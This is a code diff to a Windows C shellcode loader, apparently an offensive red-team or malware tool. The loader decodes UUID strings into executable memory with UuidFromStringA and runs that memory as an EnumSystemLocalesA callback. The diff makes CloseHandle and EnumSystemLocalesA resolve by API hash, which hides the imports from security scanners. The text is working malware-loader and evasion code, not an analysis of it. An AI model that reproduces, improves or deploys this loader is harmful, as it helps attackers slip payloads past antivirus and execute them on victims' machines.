@@ -16,24 +16,31 @@
 
 #pragma comment(lib, "cryptlib")
 
-typedef RPC_STATUS(WINAPI* Ua)(RPC_CSTR, UUID*);
-Ua fUuidFromStringA;
-
 typedef HMODULE(WINAPI* Ll)(LPCSTR);
 Ll fLoadLibraryA;
 
+typedef BOOL(WINAPI* Ch)(HANDLE);
+Ch fCloseHandle;
+
+typedef BOOL(WINAPI* Esl)(LOCALE_ENUMPROCA, DWORD);
+Esl fEnumSystemLocalesA;
+
+typedef RPC_STATUS(WINAPI* Ua)(RPC_CSTR, UUID*);
+Ua fUuidFromStringA;
+	
 int main()
 {
-	// Get LoadLibraryA
     fLoadLibraryA = (Ll)GetProcAddressWithHash(0x0726774C);
-	if (!fLoadLibraryA)
+    fCloseHandle = (Ch)GetProcAddressWithHash(0x528796C6);
+    fEnumSystemLocalesA = (Esl)GetProcAddressWithHash(0x5B6BC072);
+	if (!fLoadLibraryA || !fCloseHandle || !fEnumSystemLocalesA)
 	{
 #ifdef _DEBUG
-        printf("[-] Unable to get proc address: LoadLibraryA\n");
-#endif		
+        printf("[-] Unable to get proc address:\n  LoadLibraryA\n   CloseHandle\n   EnumSystemLocalesA\n");
+#endif
+        return -1;
 	}
 
-	// Load Rpcrt4.dll
     HMODULE rpcrt4Dll = fLoadLibraryA("Rpcrt4.dll");
     if (!rpcrt4Dll)
     {
@@ -43,7 +50,6 @@ int main()
 	    return -1;
     }
 
-	// Get UuidFromStringA
 	fUuidFromStringA = (Ua)GetProcAddressWithHash(0xA483218A);
 	if (!fUuidFromStringA)
 	{
@@ -88,7 +94,7 @@ int main()
             printf("[-] UuidFromStringA() != S_OK\n");
 #endif
             if (ha)
-				CloseHandle(ha);
+				fCloseHandle(ha);
             return -1;
         }
         hptr += 16;
@@ -103,8 +109,8 @@ int main()
 
 	if (ha)
 	{
-        EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
-        CloseHandle(ha);
+		fEnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
+        fCloseHandle(ha);
         return 0;
 	}
     return -2;
